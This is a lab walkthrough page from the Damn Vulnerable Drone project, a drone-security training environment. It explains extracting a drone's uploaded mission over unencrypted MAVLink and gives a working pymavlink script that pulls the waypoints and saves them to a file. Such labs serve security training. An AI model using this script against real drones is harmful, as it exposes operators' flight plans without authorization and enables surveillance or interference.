<i>Extracting and reconstructing a drone’s full flight mission via MAVLink</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Exfiltration > Mission Extraction

# Description

Mission extraction involves retrieving the list of uploaded waypoints and mission commands from a drone’s flight controller. This allows the attacker to understand intended navigation paths, objectives, and behaviors. Since many drones use unencrypted MAVLink, this data can often be pulled directly from the control channel using pymavlink.

# Resources

- [pymavlink](https://pypi.org/project/pymavlink/)
- [MAVLink Mission Protocol](https://mavlink.io/en/services/mission.html)

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

### Step 1. Setup pymavlink

<pre><code class="code mb-3 mt-3">sudo apt update
sudo apt install python3-pip
pip3 install pymavlink
</code></pre>

---

### Step 2. Create the Mission Extraction Script

Create a script named `extract_mission.py`:

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil

# Connect to the drone
master = mavutil.mavlink_connection("tcp:10.13.0.3:5760")
master.wait_heartbeat()
print("Connected to the drone.")

# Request list of mission items
master.mav.mission_request_list_send(master.target_system, master.target_component)

waypoints = []

while True:
    msg = master.recv_match(type=["MISSION_COUNT", "MISSION_ITEM_INT"], blocking=True)
    if msg.get_type() == "MISSION_COUNT":
        print(f"Expecting {msg.count} mission items...")
    elif msg.get_type() == "MISSION_ITEM_INT":
        waypoints.append(msg)
        print(f"Waypoint #{msg.seq}: lat={msg.x/1e7}, lon={msg.y/1e7}, alt={msg.z}m")
        if len(waypoints) == msg.seq + 1:
            break

# Save extracted waypoints to file
with open("mission_dump.txt", "w") as f:
    for wp in waypoints:
        f.write(f"{wp.seq},{wp.command},{wp.frame},{wp.x/1e7},{wp.y/1e7},{wp.z}\n")

print("Mission extraction complete. Saved to mission_dump.txt")
</code></pre>

---

### Step 3. Run the Script

<pre><code class="code mb-3 mt-3">python3 extract_mission.py
</code></pre>

If successful, this will produce a list of all uploaded mission items (e.g., takeoff, waypoints, RTL) in both the terminal and a file called `mission_dump.txt`.

</details>
